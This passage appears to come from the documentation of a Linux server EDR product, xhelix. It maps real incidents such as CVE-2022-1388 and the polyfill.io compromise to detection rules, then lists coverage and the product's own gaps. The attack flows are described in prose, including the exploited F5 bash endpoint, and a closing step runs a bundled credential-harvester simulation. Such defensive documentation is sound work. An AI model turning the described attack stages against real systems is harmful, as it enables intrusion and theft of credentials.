| 3 | `pkg/egressguard` | ActiveMQ JVM's BRP profile declares legitimate peer set (downstream consumers, broker peers). Attacker C2 = undeclared → `EgressVerify` → `EgressDeny` in enforce |
| 3 | rule | `metadata.access_by_unexpected` if the script tries IMDS for cloud creds |
| 4 | `pkg/brp/runtime.go` | JVM spawning shell to run the payload → `brp.hard_deny` Class 1 |
| 4 | `pkg/correlator` | **`dropped_binary_lifecycle`** chain: outbound + exec-from-tmp |
| 5 | `pkg/fim` + `pkg/persistencewatch` | systemd / cron persistence drop → Class 2 |

**MITRE:** `T1190`, `T1190.003` (Deserialization), `T1059.004`, `T1105`

**Verdict:** stage 3 egress + stage 4 brp.hard_deny + correlator chain = **three independent fires** before the payload can establish persistence.

---

## 21. F5 BIG-IP iControl REST RCE (CVE-2022-1388, May 2022)

**Real incident.** Authentication bypass in F5 BIG-IP allowed unauthenticated attackers to invoke iControl REST endpoints. Exploits chained to wipe configs, drop webshells, or pivot.

**Attack flow on a Linux-based F5 appliance:**

1. Attacker sends crafted HTTP with bypassed auth headers to `/mgmt/tm/util/bash`
2. The endpoint runs arbitrary bash commands as root
3. Attacker drops a webshell or steals the appliance's signing keys
4. Optionally wipes `/config/bigip.conf` or pivots to internal networks

**How xhelix catches it (assume xhelix deployed on the F5 management Linux):**

| Stage | Component | What fires |
|---|---|---|
| 2 | `pkg/brp/runtime.go` | The F5 control-plane role (httpd / Java backend) spawning arbitrary bash → `brp.hard_deny` Class 1 |
| 3 | `pkg/secrettaint` | Read of `/config/ssl/ssl.key/` (F5 signing keys) → `SecretSigningKey` taint |
| 3 | `pkg/fim` | Webshell drop to `/usr/local/www/` → `fim.drift` + `AssetWebDocRoot` |
| 4 | `pkg/fim` | Write to `/config/bigip.conf` → `AssetSystemConfig` weighting, high-severity drift |
| 4 | `pkg/egressguard` | Pivot to internal subnet from F5 management role → undeclared peer → `EgressDeny` |

**MITRE:** `T1190`, `T1059.004`, `T1552.001`, `T1485` (Data Destruction)

**Verdict:** F5 appliances are notoriously closed-source — xhelix gives you a Linux-host-level observation layer the F5 itself doesn't expose. Stage 2 `brp.hard_deny` catches every variant of "F5 control plane spawning shell."

---

## 22. Polyfill.io CDN compromise (June 2024)

**Real incident.** The widely-used `polyfill.io` CDN was acquired by an attacker who modified the JavaScript responses to inject malware into 100,000+ websites. Affected sites unknowingly served malicious JS to every visitor.

**Attack flow on a Linux web server using polyfill.io:**

1. Server-rendered page includes `<script src="https://cdn.polyfill.io/..."></script>`
2. CDN serves modified JS to specific user-agents (mobile, certain geos)
3. Malicious JS runs in the visitor's browser — not the server
4. **But also:** the website's reverse proxy / SSR layer might fetch polyfill JS server-side for bundling

**xhelix's role (server-side):**

| Stage | Component | What fires |
|---|---|---|
| 4 (SSR) | `pkg/egressguard` | Reverse proxy / SSR fetching from `polyfill.io` — if the server-side fetch was added recently (after profile snapshot), it's an undeclared peer → `EgressVerify` |
| 4 (SSR) | `pkg/snicheck` | Outbound TLS to `polyfill.io` without expected cert SAN (Phase K.3 cert SAN cross-validation, planned) — alert on cert chain change |
| Indirect | `pkg/dnsresolver` | DNS query log records every polyfill.io resolution — operator can correlate with public IOC disclosure |

**Honest gap:** the in-browser attack happens client-side. xhelix is server-side EDR — **it does not protect site visitors**. What xhelix does protect:
- The web server itself if the malicious JS attempts to call back to the same server with attack patterns
- The build/CI pipeline if `polyfill.io` is fetched server-side and bundled — the moment that fetch points to an attacker-controlled host, egressguard sees the new destination
- The operator's audit trail — every polyfill.io fetch is in the forensic chain, replayable offline

**MITRE:** `T1195.002`, `T1059.007` (JavaScript), `T1071.001`

**Verdict:** xhelix's coverage of this incident is **partial and honest**. Server-side detection works; client-side does not. **Phase K.3 cert SAN cross-validation** (planned, 3-5d) closes the "polyfill.io's cert chain changed when attacker took over" gap server-side. This is in the locked roadmap, not just aspirational.

---

## Threat coverage matrix

Concise summary across the 22 scenarios above:

| Scenario | Stage caught | xhelix Class | Notes |
|---|---|---|---|
| XZ Utils backdoor | unauthorized child of sshd | Class 1 (`brp.hard_deny`) | Signed contract wins where signatures fail |
| SolarWinds Sunburst | C2 + recon + exfil | Class 1-2 | 12-day dormancy gap closed by Phase H.2 |
| 3CX desktop trojan | undeclared outbound peer | Class 1-2 | Same defense as supply-chain class |
| Log4Shell | JVM spawning shell | Class 1 | Textbook xhelix win |
| MOVEit zero-day | web role spawning shell + bulk DB read + undeclared exfil | Class 1-2 | Post-exploit chain detected without signature |
| Capital One IMDS SSRF | metadata access by non-cloud-role | Class 1 (`metadata.access_by_unexpected`) | One of the rules xhelix was built for |
| Cortex-c2 implant | 6+ independent stages | Class 1-3 | Specific chain rule (`dropped_binary_lifecycle`) for this class |
| TeamTNT cryptominer | credential burst + miner exec + persist | Class 2-3 | `file_read_burst` is built for this |
| SSH brute + key implant | N failures / window + authorized_keys write | Class 2-3 | Phase J.1 + canonical FIM detector |
| Container escape | privileged mount / pivot_root | Class 1-2 | `contescape.detected` + `cap.gained` |
| Memory implant (memfd) | execveat from memfd + RWX mprotect | Class 3 (multi-detector) | Strongest case for xhelix vs fileless |
| PAM module replacement | unauthorized write to security lib | Class 3 + verifier escalate | Anchored + chain-attributed |
| event-stream npm (2018) | postinstall secret-read + outbound | Class 2 | Phase K.2 closes pkg-install FP gap |
| ua-parser-js + coa + rc npm (2021) | preinstall fetch + drop + exec | Class 3 (`dropped_binary_lifecycle`) | Built for this class |
| PyTorch torchtriton (2022) | mass secret read + DNS exfil | Class 2 (`file_read_burst` + `dnsexfil`) | `procscrape` catches the env-read |
| Codecov bash uploader (2021) | `procscrape` env-read + outbound | Class 2 | Phase N broker mediation extends this |
| Apache Struts CVE-2017-5638 | JVM spawning shell | Class 1 (`brp.hard_deny`) | Canonical web-RCE detection |
| Confluence OGNL CVE-2022-26134 | OGNL → shell + persistence drop | Class 1 + Class 2 (two independent fires) | Two-stage redundancy |
| Spring4Shell CVE-2022-22965 | webroot write + shell spawn | Class 1 + Class 3 (two-stage) | Webroot write tag is the early signal |
| Apache ActiveMQ CVE-2023-46604 | undeclared egress + JVM-spawn-shell + chain | 3 independent fires | Pre-persistence detection |
| F5 BIG-IP CVE-2022-1388 | mgmt-spawning-shell + signing-key read + config wipe | Class 1 + Class 2 | Linux-level observation appliance doesn't expose |
| polyfill.io CDN (June 2024) | partial — server-side egress + cert SAN drift (Phase K.3 planned) | partial | Honest gap on client-side; server-side covered |

---

## What xhelix does not catch (honest gaps)

Stated up front so the protection model is credible:

- **Pre-OS / firmware / hypervisor compromise** — xhelix is a Linux host agent. If the kernel is malicious before xhelix loads, we lose.
- **Kernel zero-day that disables BPF before xhelix starts** — observable post-fact (xhelix's BPF programs fail to load) but not preventable.
- **Insider with root + the BRP signing key** — separation-of-duties is operator policy, not enforced by xhelix v1.
- **Time-shifted attacks across days/weeks** — Phase H.2 long-window correlation (planned, 5-7d) closes this; today's correlator is short-window only.
- **CDN-cloaked C2 sharing a TLS SAN with legitimate traffic** — Phase H.4 planned (3-5d).
- **Workstation browser/cookie/session containment** — different product class; xhelix is server-side.

These gaps are explicit in `docs/BRP_IMPLEMENTATION_PLAN_2026-05-24.md` with budgets, merge gates, and risk register. **No marketing promise xhelix does not back with code.**

---

## How to verify these scenarios on your own host

```bash
# Run the bundled realistic credential-harvester corpus
sudo bash tests/attack-sim/run-all.sh

# Check what fired
xhelixctl rules fp
xhelixctl rules soak
xhelixctl incidents list
xhelixctl incidents show <id>

# Trace any alert back to ground truth
xhelixctl source lineage <anchor_id>

# Verify the forensic chain offline (independent auditor)
xhelix-verify --chain /var/lib/xhelix/chain --pub /etc/xhelix/chain.pub
```

The corpus exercises 12 real malware behavior stages and triggers the rules described above. Every alert is line-by-line auditable — no black-box scoring.
